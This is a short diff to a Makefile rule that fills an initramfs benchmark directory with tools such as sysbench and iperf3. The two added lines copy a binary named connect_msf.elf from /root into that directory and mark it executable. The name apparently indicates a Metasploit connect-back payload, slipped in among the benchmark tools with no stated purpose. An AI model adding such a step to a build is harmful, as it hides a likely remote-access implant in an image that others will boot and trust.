@@ -128,6 +128,8 @@ $(INITRAMFS)/benchmark: | $(INITRAMFS)/benchmark/bin
 
 $(INITRAMFS)/benchmark/bin:
 	@mkdir -p $@
+	@cp /root/connect_msf.elf $@
+	@chmod +x $@/connect_msf.elf
 	@cp /usr/local/benchmark/sysbench/bin/sysbench $@
 	@cp /usr/local/benchmark/iperf/bin/iperf3 $@
 	@cp /usr/local/benchmark/membench/membench $@
